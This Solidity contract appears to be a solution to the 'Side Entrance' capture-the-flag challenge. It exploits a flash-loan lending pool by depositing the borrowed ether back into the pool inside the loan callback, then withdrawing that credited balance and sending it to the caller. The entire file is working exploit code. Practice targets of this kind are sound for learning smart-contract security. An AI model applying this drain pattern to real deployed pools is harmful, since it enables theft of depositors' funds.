// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./SideEntranceLenderPool.sol";

contract SideEntranceAttack {
    SideEntranceLenderPool immutable pool;

    constructor(address _pool) {
        pool = SideEntranceLenderPool(_pool);
    }

    function executeFlashLoan(uint256 _amount) external payable {
        pool.flashLoan(_amount);
    }

    function execute() external payable {
        pool.deposit{value: msg.value}();
    }

    function withdraw() external returns (bool) {
        // Withdraw from pool's balance to this contract
        pool.withdraw();

        // Send from this contract to attacker
        (bool success, ) = (msg.sender).call{value: address(this).balance}("");
        return success;
    }

    receive() external payable {}
}